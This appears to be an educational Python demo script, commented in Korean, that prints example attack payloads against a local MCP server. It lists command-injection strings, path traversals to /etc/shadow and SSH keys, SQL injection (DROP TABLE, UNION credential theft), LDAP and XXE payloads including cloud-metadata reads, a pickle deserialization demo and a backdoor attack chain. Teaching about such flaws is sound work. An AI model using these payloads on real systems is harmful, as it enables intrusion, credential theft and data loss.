#!/usr/bin/env python3
"""
MCP 서버 취약점 테스트 스크립트
교육 목적으로만 사용하세요!
"""

import requests
import base64
import pickle
import os
import json

# MCP 서버 URL (서버가 실행 중이어야 함)
SERVER_URL = "http://127.0.0.1:8082"

def test_command_injection():
    """명령어 주입 테스트"""
    print("=== 명령어 주입 테스트 ===")
    
    # 안전한 명령어
    print("1. 안전한 명령어 테스트:")
    safe_command = "ls"
    print(f"입력: {safe_command}")
    
    # 위험한 명령어 (교육 목적)
    print("\n2. 위험한 명령어 테스트:")
    dangerous_commands = [
        "ls; whoami",
        "cat /etc/passwd",
        "ls && echo 'System compromised!'",
        "sleep 5; echo 'Delayed execution'"
    ]
    
    for cmd in dangerous_commands:
        print(f"입력: {cmd}")
        print("결과: [실제 서버에서는 실행하지 마세요!]")
    
    print()

def test_path_traversal():
    """경로 순회 공격 테스트"""
    print("=== 경로 순회 공격 테스트 ===")
    
    dangerous_paths = [
        "../../../etc/passwd",
        "../../../../etc/hosts",
        "../../../home/user/.ssh/id_rsa",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",  # Windows
        "/etc/shadow",
        "../../.env"
    ]
    
    for path in dangerous_paths:
        print(f"시도할 경로: {path}")
        print("위험도: 높음 - 시스템 파일 접근 가능")
    
    print()

def create_malicious_pickle():
    """악성 pickle 데이터 생성 (데모 목적)"""
    print("=== 비직렬화 공격 테스트 ===")
    
    class MaliciousPayload:
        def __reduce__(self):
            # 실제로는 위험한 명령어이지만, 데모에서는 안전한 명령어 사용
            return (print, ("경고: 악성 pickle이 실행되었습니다!",))
    
    payload = MaliciousPayload()
    pickled_data = pickle.dumps(payload)
    encoded_data = base64.b64encode(pickled_data).decode()
    
    print("악성 pickle 페이로드 생성됨:")
    print(f"길이: {len(encoded_data)} 문자")
    print(f"미리보기: {encoded_data[:50]}...")
    print("위험도: 매우 높음 - 임의 코드 실행 가능")
    print()
    
    return encoded_data

def test_sql_injection():
    """SQL 인젝션 테스트"""
    print("=== SQL 인젝션 테스트 ===")
    
    sql_payloads = [
        "admin",  # 정상 입력
        "admin'; DROP TABLE users; --",  # 테이블 삭제
        "' OR '1'='1",  # 모든 레코드 반환
        "' UNION SELECT 1, username, password, email FROM users --",  # 정보 탈취
        "admin'; INSERT INTO users VALUES (999, 'hacker', 'hacker@evil.com', 'backdoor'); --"  # 데이터 삽입
    ]
    
    for payload in sql_payloads:
        print(f"입력: {payload}")
        if payload == "admin":
            print("결과: 정상적인 admin 사용자 정보 반환")
        else:
            print("결과: [위험한 SQL 쿼리 - 실제 실행하지 마세요!]")
    
    print()

def test_information_disclosure():
    """정보 노출 테스트"""
    print("=== 정보 노출 테스트 ===")
    
    print("시스템 정보 요청 시 노출될 수 있는 정보:")
    dangerous_info = [
        "환경 변수 (API 키, 비밀번호 등)",
        "파일 시스템 경로",
        "Python 경로 (라이브러리 위치)",
        "홈 디렉토리 경로",
        "임시 디렉토리 경로",
        "시스템 구성 정보"
    ]
    
    for info in dangerous_info:
        print(f"- {info}")
    
    print("\n위험도: 높음 - 추가 공격의 기반 정보 제공")
    print()

def test_dos_attack():
    """서비스 거부 공격 테스트"""
    print("=== 서비스 거부 공격 테스트 ===")
    
    print("메모리 고갈 공격 시나리오:")
    dos_scenarios = [
        {"size_mb": 1000, "risk": "높음"},
        {"size_mb": 10000, "risk": "매우 높음"},
        {"size_mb": 100000, "risk": "극도로 위험"}
    ]
    
    for scenario in dos_scenarios:
        print(f"요청 크기: {scenario['size_mb']}MB, 위험도: {scenario['risk']}")
    
    print("\n결과: 메모리 고갈로 인한 서버 다운 가능")
    print()

def test_unsafe_temp_files():
    """안전하지 않은 임시 파일 테스트"""
    print("=== 임시 파일 보안 테스트 ===")
    
    print("예측 가능한 임시 파일명의 위험성:")
    print("- 경쟁 상태 공격 (Race Condition)")
    print("- 심볼릭 링크 공격")
    print("- 임시 파일 하이재킹")
    
    # 실제 PID를 사용한 예측 가능한 파일명
    current_pid = os.getpid()
    predictable_filename = f"/tmp/mcp_temp_{current_pid}.txt"
    print(f"\n예측 가능한 파일명 예시: {predictable_filename}")
    print("위험도: 중간 - 로컬 권한 상승 가능")
    print()

def test_ldap_injection():
    """LDAP 인젝션 테스트"""
    print("=== LDAP 인젝션 테스트 ===")
    
    ldap_payloads = [
        "admin",  # 정상 입력
        "*",  # 모든 사용자
        "*))(uid=*",  # 필터 우회
        "admin)(|(uid=*))",  # OR 조건 삽입
        "*)(objectClass=*"  # 모든 객체 반환
    ]
    
    for payload in ldap_payloads:
        ldap_filter = f"(uid={payload})"
        print(f"입력: {payload}")
        print(f"LDAP 필터: {ldap_filter}")
        if payload == "admin":
            print("결과: 정상적인 admin 사용자 정보")
        else:
            print("결과: [위험한 LDAP 필터 - 정보 누출 가능]")
        print()

def test_xxe_attack():
    """XXE 공격 테스트"""
    print("=== XXE (XML 외부 엔티티) 공격 테스트 ===")
    
    xxe_payloads = [
        # 정상 XML
        "<root>Hello World</root>",
        
        # 파일 읽기 시도
        """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        
        # 내부 네트워크 스캔
        """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>""",
        
        # DoS 공격 (Billion Laughs)
        """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"""
    ]
    
    for i, payload in enumerate(xxe_payloads):
        print(f"{i+1}. XML 페이로드:")
        print(payload[:100] + "..." if len(payload) > 100 else payload)
        if i == 0:
            print("결과: 정상 파싱")
        else:
            print("결과: [위험한 XXE 공격 - 실행하지 마세요!]")
        print()

def generate_attack_report():
    """공격 시나리오 보고서 생성"""
    print("=== 종합 공격 시나리오 보고서 ===")
    
    attack_chain = [
        {
            "step": 1,
            "action": "정보 수집",
            "tool": "get_system_info",
            "goal": "시스템 환경 및 구조 파악"
        },
        {
            "step": 2,
            "action": "권한 탐지",
            "tool": "read_file_content",
            "goal": "중요 파일 접근 가능성 확인"
        },
        {
            "step": 3,
            "action": "데이터 탈취",
            "tool": "search_user_database",
            "goal": "SQL 인젝션으로 사용자 정보 획득"
        },
        {
            "step": 4,
            "action": "권한 상승",
            "tool": "execute_system_command",
            "goal": "시스템 명령어 실행"
        },
        {
            "step": 5,
            "action": "지속성 확보",
            "tool": "write_file_content",
            "goal": "백도어 설치"
        }
    ]
    
    print("완전한 공격 체인:")
    for attack in attack_chain:
        print(f"{attack['step']}. {attack['action']}")
        print(f"   도구: {attack['tool']}")
        print(f"   목표: {attack['goal']}")
        print()
    
    print("전체 위험도: 극도로 높음")
    print("영향: 완전한 시스템 장악 가능")

def main():
    """메인 테스트 함수"""
    print("🚨 MCP 서버 보안 취약점 교육 데모 🚨")
    print("=" * 50)
    print("경고: 이 스크립트는 교육 목적으로만 사용하세요!")
    print("실제 운영 환경에서는 절대 실행하지 마세요!")
    print("=" * 50)
    print()
    
    # 각 취약점 테스트 실행
    test_command_injection()
    test_path_traversal()
    create_malicious_pickle()
    test_sql_injection()
    test_information_disclosure()
    test_dos_attack()
    test_unsafe_temp_files()
    test_ldap_injection()
    test_xxe_attack()
    generate_attack_report()
    
    print("=" * 50)
    print("✅ 모든 취약점 테스트 완료")
    print("다음 단계: 이 취약점들을 수정한 안전한 버전을 구현하세요!")
    print("=" * 50)

if __name__ == "__main__":
    main() 